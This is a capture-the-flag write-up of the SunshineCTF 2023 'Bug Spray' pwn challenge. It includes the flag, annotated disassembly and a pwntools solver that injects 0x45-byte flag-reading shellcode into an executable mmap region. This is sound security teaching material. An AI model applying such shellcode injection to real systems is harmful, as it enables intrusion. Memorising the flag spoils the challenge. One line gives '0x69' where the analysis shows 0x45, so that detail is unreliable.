# Bug Spray

## Description

> Introducing the "BugShield Assembly Defender" – your trusted companion against unwanted interruptions in your software assembly process!
>
> 🔒 Secure Protection: BugShield Assembly Defender is your ultimate line of defense, designed to keep your assembly code clean and bug-free. It acts like a protective shield for your projects.
>
> 💼 Seamless Integration: This bug spray seamlessly integrates with your assembly environment, making it an essential part of your toolkit. Just a few clicks, and you're ready to go!
>
> 🕊️ Lightweight Solution: Unlike heavy-duty tools, BugShield is incredibly lightweight, ensuring it won't slow down your assembly process. It's as efficient as a finely tuned assembly code itself.
>
> 🌐 Broad Spectrum: BugShield Assembly Defender is versatile, safeguarding your code from a wide range of bugs and glitches. Say goodbye to segmentation faults, infinite loops, and other common assembly hiccups.
>
> 💡 User-Friendly: With an intuitive interface, BugShield is easy to use for assembly programmers of all skill levels. No need to be a debugging expert – BugShield has got you covered.
>
> 🚀 Boost Productivity: By eliminating bugs and optimizing your code, BugShield Assembly Defender allows you to focus on what truly matters: creating efficient, high-performance assemblies.
>
> Say farewell to assembly woes and confidently tackle your coding projects with BugShield Assembly Defender. It's your reliable partner in ensuring that your assembly code runs smoothly, every time!
>
> **Server**
>
> nc chal.2023.sunshinectf.games 23004
>
> Attachment: bugspray

## Flag

sun{mosquitos_and_horseflies_and_triangle_bugs_oh_my}

## solver.py

```python
from pwn import *

elf = ELF("bugspray")
context.binary = elf


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("chal.2023.sunshinectf.games", 23004)

    # gdb is not working in this challenge
    # elif args.GDB:
    #     gdbscript = """
    #     c
    #     """
    #     io = gdb.debug(elf.path, gdbscript=gdbscript)

    else:
        io = elf.process()

    return io


def gen_payload() -> bytes:
    sc = b""
    sc += asm(shellcraft.amd64.linux.cat("flag.txt"))
    sc += asm(shellcraft.amd64.linux.exit(0))

    assert len(sc) <= 0x45

    payload = b""
    payload += sc
    payload += b"\x90" * (0x45 - len(payload))

    return payload


def main():
    io = conn()
    payload = gen_payload()

    io.sendafter(b"AskMe >>> \x00\x00", payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Solution

```console
root@kali:~/ctf/SunshineCTF_2023/pwn/Bug Spray# checksec bugspray
[*] '/root/ctf/SunshineCTF_2023/pwn/Bug Spray/bugspray'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Looking at disassembled code with `r2`.

```asm
┌ 178: entry0 (signed int64_t arg4);
│           ; arg signed int64_t arg4 @ rcx
│           0x00401000      b801000000     mov eax, 1                  ; [01] -r-x section size 178 named .text
│           0x00401005      bf01000000     mov edi, 1
│           0x0040100a      48be00204000.  movabs rsi, loc.prompt      ; 0x402000 ; "AskMe >>> "
│           0x00401014      ba0c000000     mov edx, 0xc                ; 12
│           0x00401019      0f05           syscall
```

call: `write(fd=1, buf="AskMe >>> ", n=0xc)`

```asm
│           0x0040101b      b809000000     mov eax, 9
│           0x00401020      bf77777700     mov edi, 0x777777           ; 'www'
│           0x00401025      be2c010000     mov esi, 0x12c              ; 300
│           0x0040102a      ba07000000     mov edx, 7
│           0x0040102f      41ba22000000   mov r10d, 0x22              ; '\"' ; 34
│           0x00401035      49c7c0ffffff.  mov r8, 0xffffffffffffffff
│           0x0040103c      41b900000000   mov r9d, 0
│           0x00401042      0f05           syscall
```

call: `mmap(addr=0x777777, length=0x12c, prot=7, flags=0x22, fd=0xffffffffffffffff, offset=0)`

```asm
│           0x00401044      41bc64000000   mov r12d, 0x64              ; 'd' ; 100
│           ;-- loop:
│           ; CODE XREF from entry0 @ 0x401050
│       ┌─> 0x0040104a      49ffc2         inc r10
│       ╎   0x0040104d      4d39e2         cmp r10, r12
│       └─< 0x00401050      75f8           jne loc.loop
```

Loop until r10 is 0x64

```asm
│           0x00401052      b800000000     mov eax, 0
│           0x00401057      bf00000000     mov edi, 0
│           0x0040105c      be77777700     mov esi, 0x777777           ; 'www'
│           0x00401061      baf4010000     mov edx, 0x1f4              ; 500
│           0x00401066      0f05           syscall
```

call: `read(0, 0x777777, 0x1f4)`

After `read` called, the number of input size is stored to rax (eax).

```asm
│           0x00401068      4883c020       add rax, 0x20               ; 32
│           0x0040106c      41bb66000000   mov r11d, 0x66              ; 'f' ; 102
```

- `rax += 0x20`
- `r11d = 0x66`

```asm
│           0x00401072      4c39d0         cmp rax, r10
│       ┌─< 0x00401075      7c23           jl loc.bugspray
│       │   0x00401077      4c39d8         cmp rax, r11
│      ┌──< 0x0040107a      7d1e           jge loc.bugspray
```

rax is compared to r10 and r11.
r10 and r11 are respectively 0x64 (100) and 0x66 (102).
If `0x64 <= rax < 0x66`, it does not jump to `bugspray`.

Thus, to prevent jumping to `bugspray`, input size in `read` syscall must be 0x44 (68) or 0x45 (69).

```asm
│      ││   0x0040107c      bf00000000     mov edi, 0
│      ││   0x00401081      be00000000     mov esi, 0
│      ││   0x00401086      ba00000000     mov edx, 0
│      ││   0x0040108b      0f05           syscall
```

If input size in `read` syscall is:

- 0x44 (68), call `times(buffer=0)`
- 0x45 (69), call `ptrace(request=PTRACE_TRACEME, vararg_0=0, vararg_1=0)`

```asm
│      ││   0x0040108d      4885c0         test rax, rax
│     ┌───< 0x00401090      7416           je loc.off
```

If rax is 0, it jumps to `off`, else next instruction (`0x00401092`) is called.
Called `times` syscall, it does not store rax to 0x0, so it's required input size is 0x69 to call `ptrace`.

`man execve`

> If the current program is being ptraced, a SIGTRAP signal is sent to it after a successful execve().

Since the process is being traced with `ptrace`, it is not possible to call `execve` like running /bin/sh.

```asm
│     │││   0x00401092      4831c0         xor rax, rax
│     │││   0x00401095      b964000000     mov ecx, 0x64               ; 'd' ; 100
│     │││   ;-- bugspray:
│     │││   ; CODE XREFS from entry0 @ 0x401075, 0x40107a
│    ┌─└└─> 0x0040109a      48ffc0         inc rax
│    ╎│     0x0040109d      68dacac100     push 0xc1cada
│    ╎│     0x004010a2      4839c8         cmp rax, rcx                ; arg4
│    └────< 0x004010a5      7cf3           jl loc.bugspray
│     │     0x004010a7      c3             ret
```

There is nothing more we can do once `bugspray` is called.

```asm
│     │     ;-- off:
│     │     ; CODE XREF from entry0 @ 0x401090
│     └───> 0x004010a8      4831d2         xor rdx, rdx
│           0x004010ab      ba77777700     mov edx, 0x777777           ; 'www'
└           0x004010b0      ffe2           jmp rdx
```

It jumps to the address at rdx.
rdx is 0x777777, which is allocated address of memory by `mmap` syscall.

Therefore, it seems to good to meet the following:

- Shellcode size is 0x45
- Shellcode does not have `execve` syscall. Instead, it has `open`, `read`, and `write` syscall to read a file.

As an aside, in terms of preventing `execve` with `ptrace`, there is a similar challenge in [RPISEC/MBE](https://github.com/RPISEC/MBE)'s [lab03B](https://github.com/RPISEC/MBE/blob/master/src/lab03/lab3B.c).


## References

- [x86 Assembly/Interfacing with Linux - Wikibooks, open books for an open world](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux)
- [The Fascinating World of Linux System Calls – Sysdig](https://sysdig.com/blog/fascinating-world-linux-system-calls/)

## Appendix

- x86_64 system call table in Debian
  - /usr/include/x86_64-linux-gnu/sys/syscall.h
  - /usr/include/x86_64-linux-gnu/asm/unistd.h
  - /usr/include/x86_64-linux-gnu/asm/unistd_64.h

<details><summary>full entry0 dissasembled with r2</summary>

```asm
┌ 178: entry0 (signed int64_t arg4);
│           ; arg signed int64_t arg4 @ rcx
│           0x00401000      b801000000     mov eax, 1                  ; [01] -r-x section size 178 named .text
│           0x00401005      bf01000000     mov edi, 1
│           0x0040100a      48be00204000.  movabs rsi, loc.prompt      ; 0x402000 ; "AskMe >>> "
│           0x00401014      ba0c000000     mov edx, 0xc                ; 12
│           0x00401019      0f05           syscall
│           0x0040101b      b809000000     mov eax, 9
│           0x00401020      bf77777700     mov edi, 0x777777           ; 'www'
│           0x00401025      be2c010000     mov esi, 0x12c              ; 300
│           0x0040102a      ba07000000     mov edx, 7
│           0x0040102f      41ba22000000   mov r10d, 0x22              ; '\"' ; 34
│           0x00401035      49c7c0ffffff.  mov r8, 0xffffffffffffffff
│           0x0040103c      41b900000000   mov r9d, 0
│           0x00401042      0f05           syscall
│           0x00401044      41bc64000000   mov r12d, 0x64              ; 'd' ; 100
│           ;-- loop:
│           ; CODE XREF from entry0 @ 0x401050
│       ┌─> 0x0040104a      49ffc2         inc r10
│       ╎   0x0040104d      4d39e2         cmp r10, r12
│       └─< 0x00401050      75f8           jne loc.loop
│           0x00401052      b800000000     mov eax, 0
│           0x00401057      bf00000000     mov edi, 0
│           0x0040105c      be77777700     mov esi, 0x777777           ; 'www'
│           0x00401061      baf4010000     mov edx, 0x1f4              ; 500
│           0x00401066      0f05           syscall
│           0x00401068      4883c020       add rax, 0x20               ; 32
│           0x0040106c      41bb66000000   mov r11d, 0x66              ; 'f' ; 102
│           0x00401072      4c39d0         cmp rax, r10
│       ┌─< 0x00401075      7c23           jl loc.bugspray
│       │   0x00401077      4c39d8         cmp rax, r11
│      ┌──< 0x0040107a      7d1e           jge loc.bugspray
│      ││   0x0040107c      bf00000000     mov edi, 0
│      ││   0x00401081      be00000000     mov esi, 0
│      ││   0x00401086      ba00000000     mov edx, 0
│      ││   0x0040108b      0f05           syscall
│      ││   0x0040108d      4885c0         test rax, rax
│     ┌───< 0x00401090      7416           je loc.off
│     │││   0x00401092      4831c0         xor rax, rax
│     │││   0x00401095      b964000000     mov ecx, 0x64               ; 'd' ; 100
│     │││   ;-- bugspray:
│     │││   ; CODE XREFS from entry0 @ 0x401075, 0x40107a
│    ┌─└└─> 0x0040109a      48ffc0         inc rax
│    ╎│     0x0040109d      68dacac100     push 0xc1cada
│    ╎│     0x004010a2      4839c8         cmp rax, rcx                ; arg4
│    └────< 0x004010a5      7cf3           jl loc.bugspray
│     │     0x004010a7      c3             ret
│     │     ;-- off:
│     │     ; CODE XREF from entry0 @ 0x401090
│     └───> 0x004010a8      4831d2         xor rdx, rdx
│           0x004010ab      ba77777700     mov edx, 0x777777           ; 'www'
└           0x004010b0      ffe2           jmp rdx
```

</details>
